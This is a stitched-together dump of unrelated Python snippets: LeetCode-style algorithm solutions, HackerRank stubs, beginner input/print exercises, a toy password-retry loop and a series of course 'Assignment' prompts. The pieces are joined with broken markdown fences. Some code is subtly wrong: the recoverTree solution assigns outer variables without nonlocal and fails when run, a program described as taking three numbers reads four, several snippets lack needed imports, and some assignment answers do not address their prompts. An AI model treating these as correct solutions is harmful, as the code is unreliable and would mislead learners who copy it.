d = int(input("Enter the Fourth Number"))

result = max(a, b, c, d)

print("Max of the numbers entered is {}".format(result))

class Solution:
    def isPalindrome(self, x):
        """
        :type x: int
        :rtype: bool
        """

        # O(log_n)
        if x < 0 or (x != 0 and x % 10 == 0):
            return False
        rev = 0
        while x > rev:
            rev = rev * 10 + x % 10
            x = x // 10
        return rev // 10 == x or rev == x
        # # O(n)
        # if x < 0 or (x != 0 and x % 10 == 0): return False
        # x = str(x)
        # l, r = 0, len(x)-1
        # while l < r:
        #     if x[l] != x[r]:
        #         return False
        #     l += 1
        #     r -= 1
        # return True

class Solution:
    def subsetsWithDup(self, nums: List[int]) -> List[List[int]]:
        result = []
        self.backtrack(sorted(nums), [], result)
        return result

    def backtrack(self, nums, path, result):
        result.append(path)
        if not nums:
            return
        for i in range(len(nums)):
            if i > 0 and nums[i - 1] == nums[i]:
                continue
            self.backtrack(nums[i + 1 :], path + [nums[i]], result)

class Solution:
    def totalFruit(self, tree: List[int]) -> int:
        count = 0
        start, d, result = 0, {}, 0
        for i, t in enumerate(tree):
            d[t] = d.get(t, 0) + 1
            if d[t] == 1:
                count += 1
            while count > 2:
                x = tree[start]
                d[x] -= 1
                if d[x] == 0:
                    count -= 1
                start += 1
            result = max(result, i - start + 1)
        return result

class Solution:
    def sortArrayByParity(self, A: List[int]) -> List[int]:
        start, end = 0, len(A) - 1
        while start < end:
            if A[start] % 2 == 0:
                start += 1
            else:
                if A[end] % 2 == 1:
                    end -= 1
                else:
                    A[start], A[end] = A[end], A[start]
                    start += 1
                    end -= 1
        return A

class Solution:
    def numDecodings(self, s: str) -> int:
        n = len(s)
        dp = [0] * (n + 1)
        dp[0] = 1
        for i in range(n):
            if s[i] > "0":
                dp[i + 1] += dp[i]
            if i > 0 and "10" <= s[i - 1 : i + 1] <= "26":
                dp[i + 1] += dp[i - 1]
        return dp[-1]

    # def numDecodings(self, s):
    #     """
    #     :type s: str
    #     :rtype: int
    #     """
    #     f0 = 0
    #     e0, e1, e2 = 1, 0, 0
    #     for c in s:
    #         f0 = (c > '0') * e0 + e1 + e2 * (c < '7')
    #         e1 = e0 if c == '1' else 0
    #         e2 = e0 if c == '2' else 0
    #         e0 = f0
    #     return f0

class Solution:
    def reverseBetween(self, head, m, n):
        """
        :type head: ListNode
        :type m: int
        :type n: int
        :rtype: ListNode
        """
        if not head:
            return None
        dummy = ListNode(0)
        dummy.next = head
        prev = dummy
        for _ in range(m - 1):
            prev = prev.next
        start = prev.next
        then = start.next
        for _ in range(n - m):
            then.next, start.next = prev.next, then.next
            prev.next = then
            then = start.next
        return dummy.next

import collections


class Solution:
    def minMalwareSpread(self, graph: List[List[int]], initial: List[int]) -> int:
        def find(node):
            while node != roots[node]:
                roots[node] = roots[roots[node]]
                node = roots[roots[node]]
            return node

        def union(x, y):
            roots[find(x)] = find(y)

        n = len(graph)
        roots = list(range(n))
        for i in range(n):
            for j in range(i + 1, n):
                if graph[i][j] == 1:
                    union(i, j)
        unions = collections.Counter(find(x) for x in range(n))
        malwares = collections.Counter(find(x) for x in initial)
        return min(
            initial, key=lambda x: [(malwares[find(x)] == 1) * -unions[find(x)], x]
        )
````

````py
A string of '0's and '1's is monotone increasing if it consists of some number of '0's (possibly 0), followed by some number of '1's (also possibly 0.)

We are given a string S of '0's and '1's, and we may flip any '0' to a '1' or a '1' to a '0'.

Return the minimum number of flips to make S monotone increasing.



Example 1:

Input: "00110"
Output: 1
Explanation: We flip the last digit to get 00111.
Example 2:

Input: "010110"
Output: 2
Explanation: We flip to get 011111, or alternatively 000111.
Example 3:

Input: "00011000"
Output: 2
Explanation: We flip to get 00000000.


Note:

1 <= S.length <= 20000
S only consists of '0' and '1' characters.```


```py


class Solution(object):
    def minFlipsMonoIncr(self, S):
        """
        :type S: str
        :rtype: int
        """
        ones = [0]
        for char in S:
            ones.append(ones[-1] + int(char))
        # print ones
        result = float("inf")
        for index in range(len(ones)):
            zeroes = len(S) - index - (ones[-1] - ones[index])
            result = min(zeroes + ones[index], result)
        return result

class Solution:
    def numUniqueEmails(self, emails: List[str]) -> int:
        result = set()
        for email in emails:
            local, domain = email.split("@")
            local = local.split("+")[0].replace(".", "")
            result.add(local + "@" + domain)
        return len(result)

# time: O(3^4)


class Solution:
    def restoreIpAddresses(self, s):
        """
        :type s: str
        :rtype: List[str]
        """
        res = []
        self.dfs(res, s, 0, "", 0)
        return res

    def dfs(self, res, s, secNum, sec, idx):
        if secNum > 4:
            return
        if secNum == 4 and len(sec) - 3 == len(s):
            res.append(sec)
            return
        for i in range(1, 4):
            if idx + i > len(s):
                break
            temp = s[idx : idx + i]
            if (len(temp) > 1 and temp.startswith("0")) or int(temp) > 255:
                continue
            self.dfs(
                res,
                s,
                secNum + 1,
                sec + temp if secNum == 0 else sec + "." + temp,
                idx + i,
            )

from collections import deque


class RecentCounter:
    def __init__(self):
        self.counter = deque()

    def ping(self, t: int) -> int:
        self.counter.append(t)
        while self.counter[0] < t - 3000:
            self.counter.popleft()
        return len(self.counter)


# Your RecentCounter object will be instantiated and called as such:
# obj = RecentCounter()
# param_1 = obj.ping(t)

class Solution:
    def reorderLogFiles(self, logs: List[str]) -> List[str]:
        digit_log, letter_log = [], []
        for log in logs:
            if log.split()[1].isdigit():
                digit_log.append(log)
            else:
                letter_log.append(log)
        return (
            sorted(letter_log, key=lambda x: (x.split()[1:], x.split()[0])) + digit_log
        )

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def rangeSumBST(self, root: TreeNode, L: int, R: int) -> int:
        if not root:
            return 0
        if root.val > R:
            return self.rangeSumBST(root.left, L, R)
        elif root.val < L:
            return self.rangeSumBST(root.right, L, R)
        else:
            return (
                root.val
                + self.rangeSumBST(root.left, L, R)
                + self.rangeSumBST(root.right, L, R)
            )

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def inorderTraversal(self, root):
        """
        :type root: TreeNode
        :rtype: List[int]
        """
        if not root:
            return []
        return (
            self.inorderTraversal(root.left)
            + [root.val]
            + self.inorderTraversal(root.right)
        )


# iterative
class Solution:
    def inorderTraversal(self, root: TreeNode) -> List[int]:
        stack, curr = [], root
        result = []
        while stack or curr:
            while curr:
                stack.append(curr)
                curr = curr.left
            top = stack.pop()
            result.append(top.val)
            curr = top.right
        return result

class Solution:
    def distinctSubseqII(self, S: str) -> int:
        s = [0] * 26
        for c in S:
            s[ord(c) - ord("a")] = sum(s) + 1
        return sum(s) % (10 ** 9 + 7)

class Solution:
    def validMountainArray(self, A: List[int]) -> bool:
        if len(A) <= 2 or A[0] > A[1]:
            return False
        decrease = False
        for i in range(2, len(A)):
            if A[i - 1] > A[i]:
                decrease = True
            elif A[i - 1] == A[i] or decrease:
                return False
        return decrease

class Solution:
    def validateStackSequences(self, pushed: List[int], popped: List[int]) -> bool:
        stack = []
        j = 0
        for v in pushed:
            stack.append(v)
            while stack and j < len(popped) and stack[-1] == popped[j]:
                stack.pop()
                j += 1
        return not stack

class Solution:
    def removeStones(self, stones: List[List[int]]) -> int:
        UF = {}

        def find(x):
            if x != UF[x]:
                UF[x] = find(UF[x])
            return UF[x]

        def union(x, y):
            UF.setdefault(x, x)
            UF.setdefault(y, y)
            UF[find(x)] = find(y)

        for x, y in stones:
            union(x, ~y)

        return len(stones) - len({find(x) for x in UF})

class Solution:
    def largestTimeFromDigits(self, A: List[int]) -> str:
        for time in itertools.permutations(sorted(A, reverse=True)):
            if time[:2] < (2, 4) and time[2] < 6:
                return "%d%d:%d%d" % time
        return ""

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right


class Solution:
    def generateTrees(self, n: int) -> List[TreeNode]:
        if n == 0:
            return []
        self.trees = {}
        return self.constructTree(1, n)

    def constructTree(self, start, end):
        if (start, end) in self.trees:
            return self.trees[(start, end)]
        if start > end:
            return [None]
        result = []
        for i in range(start, end + 1):
            leftnodes = self.constructTree(start, i - 1)
            rightnodes = self.constructTree(i + 1, end)
            for leftnode in leftnodes:
                for rightnode in rightnodes:
                    node = TreeNode(i)
                    node.left = leftnode
                    node.right = rightnode
                    result.append(node)
        self.trees[(start, end)] = result
        return result

class Solution:
    def isAlienSorted(self, words: List[str], order: str) -> bool:
        d = {c: i for i, c in enumerate(order)}
        new_words = [[d[c] for c in word] for word in words]
        return all(x <= y for x, y in zip(new_words, new_words[1:]))

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
from collections import deque


class Solution:
    def isCompleteTree(self, root: TreeNode) -> bool:
        queue = deque([root])
        while queue:
            curr = queue.popleft()
            if not curr:
                if queue and queue[0]:
                    return False
                else:
                    continue
            queue.append(curr.left)
            queue.append(curr.right)
        return True

# Time: O(n^2)
# Space: O(n)


class Solution:
    def numTrees(self, n):
        """
        :type n: int
        :rtype: int
        """
        # DP[n]: number of BST of a sequence with length n
        dp = [0] * (n + 1)
        dp[0] = dp[1] = 1
        for i in range(2, n + 1):
            for j in range(i):
                dp[i] += dp[j] * dp[i - 1 - j]
        return dp[n]

class Solution:
    def minAreaFreeRect(self, points: List[List[int]]) -> float:
        area, pointsSet = float("inf"), {(x, y) for x, y in points}
        n = len(points)
        for i in range(n):
            x1, y1 = points[i]
            for j in range(i + 1, n):
                x2, y2 = points[j]
                for k in range(j + 1, n):
                    x3, y3 = points[k]
                    if (
                        not (x2 - x1) * (x3 - x1) + (y2 - y1) * (y3 - y1)
                        and (x3 + (x2 - x1), y3 + (y2 - y1)) in pointsSet
                    ):
                        area = min(
                            area,
                            ((x2 - x1) ** 2 + (y2 - y1) ** 2) ** 0.5
                            * ((x3 - x1) ** 2 + (y3 - y1) ** 2) ** 0.5,
                        )
        return area if area != float("inf") else 0

class Solution:
    def numsSameConsecDiff(self, N: int, K: int) -> List[int]:
        curr = [i for i in range(10)]
        for i in range(N - 1):
            curr = {
                x * 10 + y
                for x in curr
                for y in [x % 10 - K, x % 10 + K]
                if x and 0 <= y < 10
            }
        return list(curr)

class Solution:
    def pancakeSort(self, A: List[int]) -> List[int]:
        result = []
        for n in range(len(A), 1, -1):
            idx = A.index(n)
            result.extend([idx + 1, n])
            A = A[idx::-1] + A[idx + 1 :]
            A = A[n - 1 :: -1] + A[n:]
        return result

import heapq


class Solution:
    def kClosest(self, points: List[List[int]], K: int) -> List[List[int]]:
        return heapq.nsmallest(K, points, key=lambda x: x[0] * x[0] + x[1] * x[1])

from typing import List


class Solution:
    def subarraysDivByK(self, A: List[int], K: int) -> int:
        result, curr, d = 0, 0, {0: 1}
        for num in A:
            curr += num
            result += d.get(curr % K, 0)
            d[curr % K] = d.get(curr % K, 0) + 1
        return result

class Solution:
    def sortedSquares(self, A: List[int]) -> List[int]:
        result = [None] * len(A)
        left, right = 0, len(A) - 1
        i = len(A) - 1
        while left <= right:
            if abs(A[left]) > abs(A[right]):
                result[i] = A[left] * A[left]
                left += 1
            else:
                result[i] = A[right] * A[right]
                right -= 1
            i -= 1
        return result


class Solution:
    def sortedSquares(self, A: List[int]) -> List[int]:
        return sorted(map(lambda x: x * x, A))

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


# class Solution:
#     def isValidBST(self, root: TreeNode) -> bool:
#         return self.isValid(root, float('-inf'), float('inf'))

#     def isValid(self, root, lower, upper):
#         if not root: return True
#         if root.val <= lower or root.val >= upper: return False
#         return self.isValid(root.left, lower, root.val) and self.isValid(root.right, root.val, upper)


class Solution:
    def isValidBST(self, root: TreeNode) -> bool:
        stack, curr, prev = [], root, None
        while stack or curr:
            while curr:
                stack.append(curr)
                curr = curr.left
            top = stack.pop()
            if prev and prev.val >= top.val:
                return False
            prev = top
            curr = top.right
        return True

class Solution:
    def uniquePathsIII(self, grid: List[List[int]]) -> int:
        m, n = len(grid), len(grid[0])
        x, y, empty, end = 0, 0, 1, None
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 0:
                    empty += 1
                if grid[i][j] == 1:
                    x, y = i, j

        self.result = 0

        def dfs(x, y, e):
            if x < 0 or x >= m or y < 0 or y >= n or grid[x][y] < 0:
                return
            if grid[x][y] == 2:
                self.result += e == 0
                return
            grid[x][y] = -2
            for direction in [(-1, 0), (1, 0), (0, -1), (0, 1)]:
                x1, y1 = x + direction[0], y + direction[1]
                dfs(x1, y1, e - 1)
            grid[x][y] = 0

        dfs(x, y, empty)
        return self.result

from collections import defaultdict


class TimeMap:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.values = defaultdict(list)
        self.times = defaultdict(list)

    def set(self, key: str, value: str, timestamp: int) -> None:
        self.values[key].append(value)
        self.times[key].append(timestamp)

    def get(self, key: str, timestamp: int) -> str:
        idx = bisect.bisect(self.times[key], timestamp)
        return self.values[key][idx - 1] if idx > 0 else ""


# Your TimeMap object will be instantiated and called as such:
# obj = TimeMap()
# obj.set(key,value,timestamp)
# param_2 = obj.get(key,timestamp)

from collections import deque


class Solution:
    def mincostTickets(self, days: List[int], costs: List[int]) -> int:
        cost = 0
        seven_day = deque()
        thirty_day = deque()

        for day in days:
            while seven_day and seven_day[0][0] + 7 <= day:
                seven_day.popleft()
            seven_day.append((day, cost + costs[1]))

            while thirty_day and thirty_day[0][0] + 30 <= day:
                thirty_day.popleft()

            thirty_day.append((day, cost + costs[2]))

            cost = min(cost + costs[0], seven_day[0][1], thirty_day[0][1])

        return cost
````

````py
We have an array A of integers, and an array queries of queries.

For the i-th query val = queries[i][0], index = queries[i][1], we add val to A[index].  Then, the answer to the i-th query is the sum of the even values of A.

(Here, the given index = queries[i][1] is a 0-based index, and each query permanently modifies the array A.)

Return the answer to all queries.  Your answer array should have answer[i] as the answer to the i-th query.



Example 1:

Input: A = [1,2,3,4], queries = [[1,0],[-3,1],[-4,0],[2,3]]
Output: [8,6,2,4]```


```py


class Solution(object):
    def sumEvenAfterQueries(self, A, queries):
        """
        :type A: List[int]
        :type queries: List[List[int]]
        :rtype: List[int]
        """
        result = 0
        for val in A:
            if val % 2 == 0:
                result += val

        f_result = []
        for val_index in queries:
            val, index = val_index[0], val_index[1]
            prev_val = A[index]
            if prev_val % 2 == 0:
                result -= prev_val
            new_val = prev_val + val
            if new_val % 2 == 0:
                result += new_val
            A[index] = new_val
            f_result.append(result)
        return f_result

class Solution:
    def intervalIntersection(
        self, A: List[List[int]], B: List[List[int]]
    ) -> List[List[int]]:
        result = []
        i, j = 0, 0
        while i < len(A) and j < len(B):
            A_start, A_end = A[i]
            B_start, B_end = B[j]
            if A_end >= B_start and A_start <= B_end:
                result.append([max(A_start, B_start), min(A_end, B_end)])
            if B_end >= A_end:
                i += 1
            else:
                j += 1
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right

from collections import defaultdict


class Solution:
    def verticalTraversal(self, root: TreeNode) -> List[List[int]]:
        d = defaultdict(list)

        queue = [(root, 0)]
        while queue:
            new_queue = []
            temp_d = defaultdict(list)
            for node, x in queue:
                temp_d[x].append(node.val)
                if node.left:
                    new_queue.append((node.left, x - 1))
                if node.right:
                    new_queue.append((node.right, x + 1))

            for k, v in temp_d.items():
                d[k].extend(sorted(v))
            queue = new_queue

        return [d[k] for k in sorted(d)]
````

````py
Given the root of a binary tree, each node has a value from 0 to 25 representing the letters 'a' to 'z': a value of 0 represents 'a', a value of 1 represents 'b', and so on.

Find the lexicographically smallest string that starts at a leaf of this tree and ends at the root.```


```py
# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def smallestFromLeaf(self, root):
        """
        :type root: TreeNode
        :rtype: str
        """
        self.result = "~"

        def dfs(node, A):
            if node:
                A.append(chr(node.val + ord("a")))
                if not node.left and not node.right:
                    self.result = min(self.result, "".join(reversed(A)))

                dfs(node.left, A)
                dfs(node.right, A)
                A.pop()

        dfs(root, [])
        return self.result
````

````py
 Two elements of a binary search tree (BST) are swapped by mistake.

 Recover the tree without changing its structure.

 Example 1:

 Input: [1,3,null,null,2]

    1
   /
  3
   \
    2

 Output: [3,1,null,null,2]

    3
   /
  1
   \
    2```


```py
# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def recoverTree(self, root):
        """
        :type root: TreeNode
        :rtype: void Do not return anything, modify root in-place instead.
        """

        first, second, prev = None, None, None

        def inorder(root):
            if root:
                inorder(root.left)
                if prev is not None and root.val < prev.val:
                    if first is None:
                        first = root
                    else:
                        second = root
                prev = root
                inorder(root.right)

        inorder(root)
        if first and second:
            first.val, second.val = second.val, first.val
````

````py
On a broken calculator that has a number showing on its display, we can perform two operations:

Double: Multiply the number on the display by 2, or;
Decrement: Subtract 1 from the number on the display.
Initially, the calculator is displaying the number X.

Return the minimum number of operations needed to display the number Y.



Example 1:

Input: X = 2, Y = 3
Output: 2
Explanation: Use double operation and then decrement operation {2 -> 4 -> 3}.```


```py


class Solution(object):
    def brokenCalc(self, X, Y):
        """
        :type X: int
        :type Y: int
        :rtype: int
        """
        if X == Y:
            return 0
        if X > Y:
            return X - Y
        if Y % 2 == 1:
            return 1 + self.brokenCalc(X, Y + 1)
        else:
            return 1 + self.brokenCalc(X, Y / 2)

class Solution:
    def orangesRotting(self, grid: List[List[int]]) -> int:
        rotten = []
        m, n = len(grid), len(grid[0])
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 2:
                    rotten.append((i, j))
        step = -1
        while rotten:
            new_rotten = []
            for x, y in rotten:
                for dx, dy in [(-1, 0), (1, 0), (0, 1), (0, -1)]:
                    new_x, new_y = x + dx, y + dy
                    if 0 <= new_x < m and 0 <= new_y < n and grid[new_x][new_y] == 1:
                        grid[new_x][new_y] = 2
                        new_rotten.append((new_x, new_y))
            rotten = new_rotten
            step += 1
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 1:
                    return -1
        return 0 if step == -1 else step
````

````py
In an array A containing only 0s and 1s, a K-bit flip consists of choosing a (contiguous) subarray of length K and simultaneously changing every 0 in the subarray to 1, and every 1 in the subarray to 0.

Return the minimum number of K-bit flips required so that there is no 0 in the array.  If it is not possible, return -1.

Input: A = [0,1,0], K = 1
Output: 2
Explanation: Flip A[0], then flip A[2]```


```py


class Solution:
    def minKBitFlips(self, a: "List[int]", k: "int") -> "int":
        from collections import deque

        q = deque()
        res = 0
        for i in range(len(a)):
            if len(q) % 2 != 0:
                if a[i] == 1:
                    res += 1
                    q.append(i + k - 1)
            else:
                if a[i] == 0:
                    res += 1
                    q.append(i + k - 1)
            if q and q[0] == i:
                q.popleft()
            if q and q[-1] >= len(a):
                return -1
        return res

# 9. Write a python program to take three numbers and find minimum of them

a = int(input("Enter the first number: "))
b = int(input("Enter the second number: "))
c = int(input("Enter the thrid number: "))
d = int(input("Enter the Fourth number: "))
result = min(a, b, c, d)

print("Enter minimum of three numbers entered is {}".format(result))

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the aVeryBigSum function below.
def aVeryBigSum(ar):
    return sum(ar)


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    ar_count = int(input())

    ar = list(map(int, input().rstrip().split()))

    result = aVeryBigSum(ar)

    fptr.write(str(result) + "\n")

    fptr.close()
````

```py Assignment 1

Write a short script that will get some information from the user, reformat
the information and print it back to the terminal. """


# Possible Answer
fav_movie = input("What is your favorite movie? ")
print(f"Your favorite movie is: {fav_movie}.")
```

```py Assignment 2

1. Create 3 numeric values of different types and assign them to variables.
2. Print 2 to the power 65536. """

var1 = 42
var2 = 10.5
var3 = 4 + 3j

print(2 ** 65536)
```

```py Assignment 3

Create three variables of three different types. Create a fourth variable
that formats the first three variables into a string that can be printed.
Be prepared to defend your choice of formatting style. """


duck = 4 + 8j
dog = 100
top = "Spin the top"


print(f"{dog} {duck}, {top}")
```

```py Assignment 4

Write code that does the following in order...
1. Turn the jumbled_nums tuple into a list.
2. Add the value 5 to the list.
3. Remove one of the values of 4 from the list.
4. Sort the list.
5. Insert the value 1 at the beginning of the list.
6. Turn the list back into a tuple.
7. Finally print the tuple.

Stretch Goal
1. Unpack the tuple into separate variables.
2. Construct a list from these variables. Is this a good idea? Why or why not?
3. Shuffle the list and cast it back to a tuple.
4. Print the final tuple.
5. Find and read the documentation for the collections library. """
from random import shuffle  # Required only for stretch goal


jumbled_nums = (8, 4, 2, 9, 7, 3, 6, 4)
nums_list = list(jumbled_nums)
nums_list.insert(0, 5)
nums_list.remove(4)
nums_list.sort()
nums_list.insert(0, 1)
nums_list = tuple(nums_list)
print(nums_list)
```

```py Assignment 5

1. Print the set of values that are strictly in both set_a and set_b.
2. Print the set of values that are in either set_a or set_b, but not both.
3. Print a set which contains all the values of set_a and set_b. """

set_a = {1, 2, 3, 4, 5}
set_b = {4, 5, 6, 7, 8}


# Answer
print(set_a.intersection(set_b))
print(set_a.symmetric_difference(set_b))
print(set_a.union(set_b))
```

```py Assignment 6

Create a dictionary of waypoints.
Each waypoint should itself be a dictionary.
Write a loop that will print the name of each city on a new line.
```

```py

col = {"key1": [1, 2, 3], "key2": [4, 5, 6], "key3": [7, 8, 9]}

print(col)
```

```py Assignment 7

Write a short script that will get a name from the user.
Find the length of the name.
If the length is lower than 5 print "Under".
If the length is more than 5 print "Over".
If the length is exactly 5 print "Five".

Try to use 'if', 'else' and 'elif' exactly once each.
Also, try not to evaluate the length of the name more than once. """


a = 1

if not a:
    print("a")
elif a == 1:
    print("a is 1")
else:
    print("not a")
```

```py Assignment 8

1. Write a function that will return True if the passed-in number is even,
and False if it is odd.
2. Write a second function that will call the first with values 0-6 and print
each result on a new line.
3. Invoke the second function.

The signature of the first function should be: `is_even(num: int) -> bool`
The signature of the second function should be: `test_is_even() -> None` """


# Answer
def is_even(num: int) -> bool:
    return num % 2 == 0


def test_is_even() -> None:
    for i in range(7):
        print(is_even(i))


test_is_even()
```

```py Assignment 9

Import the random module and design a dice function. The dice function should
take two arguments, one for the number of rolls and one for the size or number
of sides of the dice. The function should simulate rolling the dice and finally
return the sum of all the rolls.

When this file is imported it should only add the dice function to the target
namespace. However, when this file is run from the terminal it should also do
the following:

Print the result of rolling eight six sided dice (8d6). Format the result as if
this was the damage dealt by a fireball spell in an RPG. Or come up with your
own creative usage of the dice function.

Hint: You may need to search online for the following:
    __all__
    if __name__ == "__main__"

Prepare to defend you choice of import style. """
from Fortuna import random_value
from MonkeyScope import distribution_timer
from random import choice


arr = ("Apple", "Grapes", "Orange", "Cherry", "Pear")

distribution_timer(random_value, arr)
distribution_timer(choice, arr)
```

```py Assignment 10

First import A09_modules.py this should add the dice function you created
to the namespace.

Create a class hierarchy consisting of 1 base class and 3 derived classes.
Create a fourth class that embeds one of the derived classes.

Use your dice function somewhere in this module to spice things up.

You should exercise what you've learned about polymorphism and
inheritance. In addition, you should use at least three different
magic methods.

In the (if __name__ == "__main__":) block you should instantiate some of
your classes and show them off. """


class Fork:
    c_var = 42

    def __init__(self):
        self.i_var = "forty two"

    def __str__(self):
        return f"{self.i_var}, {self.c_var}"

    def __call__(self):
        return self.c_var

    def some_method(self):
        return True


fork = Fork()
print(fork())
```

```py Assignment 11

Practice with deepcopy.

Try to devise an example where copy and deepcopy have different behavior.

Explain what happens in your example and why. """
```

```py Assignment 12

Create a function with the `*args` parameter. The function should handle an
unbounded number of inputs without error. """
```

```py Assignment 13

1. Turn the provided iterable into an iterator.
2. How does one automatically unpack all values from an iterator?
    Does this work everywhere?

Stretch Goals:
1. Write a function to take any iterable and return an iterator.
2. Which way to create an iterator is better or more pythonic and why?
3. Test your solutions to make sure they produce the same output.
4. Read the documentation for itertools. """


iterable = range(100)
```

```py Assignment 14

1. Create a generator or generator expression that will count from zero to 100
by increments of 5.
2. Print the output on one line without casting it to another structure type.
3. What happens when you attempt to print it a second time?

Stretch Goals:
1. Create a generator expression that does the same thing as above but make it
reusable.
2. Prove that your second solution is reusable.
3. Parameterize this solution so that it can count from any number to any
number by any number. The step input should have a default value of 1.
4. What logical problems might occur if no error handling
is implemented? What happens when you feed it strange input?
5. Before you turn in the assignment - comment out any error examples. """
```

```py Assignment 15

1. Complete the log_this decorator such that it will print the output of the
following `square` function when it is called.

Stretch
1. Make sure the help feature of `square()` still works properly.
2. Write the decorator in such a way to allow for an arbitrary number of
positional and keyword arguments for the original function.
3. Read the documentation for the functools library. """
from functools import wraps  # Required for stretch goal
```

```py Assignment 16

1. Define your own class. It should have 3-5 fields,
at least one of them should have a default value.
2. Write a method for printing the information from the class. This can be done
with `__str__` or `__repr__` if you use repr here - include a note to indicate why.
3. Print the class info.

Stretch Goals:
1. Derive a new class from your class using inheritance, it should have at least
one additional parameter.
2. What problems do you encounter? If you encountered no problems, add docstrings
to both classes where appropriate.
3. Make sure the classes are available to anyone importing this file as a library,
but also make sure that the printing of the class info only happens when your
script is executed as main and not when it is imported. """
```

```py Assignment 17

For this assignment you should design, build and deploy a Python3 package
and answer the following:

1. What is the fundamental difference between a python package and a module?

2. What changes do we need to make in the `setup.py` script in relation to
developing a package vs a module?
```

```py

```

````py Assignment 18

1. Detail the steps to Cythonize a Python module.


Stretch Goal:
1. Detail the steps to Cythonize a C++ Header Library. Include code examples.
2. Read the documentation for Cython.```


```py
````

```py Assignment 19

1. Create your own custom tools.

Stretch Goal:
1. Deploy your custom tools to the PyPi repository. """

def sumOfSeries(n):
    x = n * (n + 1) / 2
    return (int)(x * x)


# Driver Function
n = 5
print(sumOfSeries(n))

# Program to find the ASCII value of the given character

c = "p"
print("The ASCII value of '" + c + "' is", ord(c))

import time

pwd = "AKS2608"  # any password u want to set


def IInd_func():
    count1 = 0
    for j in range(5):
        a = 0
        count = 0
        user_pwd = input("")  # password you remember
        for i in range(len(pwd)):
            if user_pwd[i] == pwd[a]:  # comparing remembered pwd with fixed pwd
                a += 1
                count += 1
        if count == len(pwd):
            print("correct pwd")
            break
        else:
            count1 += 1
            print("not correct")
    if count1 == 5:
        time.sleep(30)
        IInd_func()


IInd_func()

# This program adds two numbers

num1 = 1.5
num2 = 6.3

# Add two numbers
sum = num1 + num2

# Display the sum
print("The sum of {0} and {1} is {2}".format(num1, num2, sum))

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def addTwoNumbers(self, l1: ListNode, l2: ListNode) -> ListNode:
        c = 0
        res = []
        while l1 or l2:
            s = 0 + c
            if l1:
                s += int(l1.val)
                l1 = l1.next
            if l2:
                s += int(l2.val)
                l2 = l2.next
            print(s)

            resa = s % 10
            res.append(resa)
            c = s // 10

        if c != 0:
            res.append(c)

        l3 = ListNode(0)
        head = l3
        for i in range(0, len(res)):
            lt = res[i]
            l3.next = ListNode(lt)
            l3 = l3.next
        return head.next

# Given two binary strings, return their sum (also a binary string).
#
# The input strings are both non-empty and contains only characters 1 or 0.
#
# Example 1:
#
# Input: a = "11", b = "1"
# Output: "100"


# Example 2:
#
# Input: a = "1010", b = "1011"
# Output: "10101"


class Solution:
    def addBinary(self, a, b):
        x, y = int(a, 2), int(b, 2)

        while y:
            answer = x ^ y
            carry = (x & y) << 1
            x, y = answer, carry

        return bin(x)


if __name__ == "__main__":
    a = "1010"
    b = "1011"
    print(Solution().addBinary(a, b))

def allIndexes(input, x, start):

    # If the start index is equal to end of array then return empty array
    if start == len(input):
        ans = []
        return ans

    # recursion

    smallIndex = allIndexes(input, x, start + 1)
    # If the element at start index is equal to x then put the start in first index of array.
    if input[start] == x:
        myAns = [0 for i in range(len(smallIndex) + 1)]
        myAns[0] = start
        for i in range(len(smallIndex)):

            # Shift the elements of the array by 1 to right
            myAns[i + 1] = smallIndex[i]
        return myAns
    else:
        return smallIndex


def allIndices(input, x):
    return allIndexes(input, x, 0)


n = int(input("Enter size of array : "))
arr = []
for i in range(n):
    e = int(input())
    arr.append(e)

x = int(input())

output = allIndices(arr, x)

# Printing the output array

for i in output:

    print(i, end=" ")
# Example
# Input 5
# 6 5 6 7 5
# Output
# 0,2

from countryinfo import CountryInfo


country_name = "India"
a = CountryInfo(country_name)

info_1 = a.alt_spellings()
print(info_1)

info_2 = a.capital()
print(info_2)

info_3 = a.languages()
print(info_3)

info_4 = a.timezones()
print(info_4)

info_5 = a.currencies()
print(info_5)

info_6 = a.area()
print(info_6)

info_7 = a.borders()
print(info_7)

info_8 = a.calling_codes()
print(info_8)

info_9 = a.wiki()
print(info_9)

info_10 = a.info()
for p, q in info_10.items():
    print(f"{p}     {q}")

def bishopAndPawn(bishop, pawn):
    if ord(bishop[0]) == ord(pawn[0]):
        return False
    else:
        bishop_elm = ord(bishop[0]) + int(bishop[1])
        pawn_elm = ord(pawn[0]) + int(pawn[1])
        return (bishop_elm + pawn_elm) % 2 == 0

def complementary():
    while True:
        complementary = float(input("Complementary of : "))
        if complementary <= 90:
            complement = 90 - complementary
            return complement
            break
        else:
            print("Number greater than 90 degree. Try again")
            continue


def supplementary():
    while True:
        supplementary = float(input("Supplementary of : "))
        if supplementary <= 180:
            supplement = 180 - supplementary
            return supplement
            break
        else:
            print("Number greater than 180 degree. Try again")
            continue


while True:
    countOrEnd = str(input("Count or End : "))
    if countOrEnd.strip() == "Count":
        print("\nSupp for supplementary\nComp for complementary")
        getSuppOrCom = str(input("Supp or Comp : "))
        if getSuppOrCom.strip() == "Supp":
            print(supplementary())
            continue
        elif getSuppOrCom.strip() == "Comp":
            print(complementary())
            continue
        else:
            break
    else:
        quit()

# Enter your code here. Read input from STDIN. Print output to STDOUT
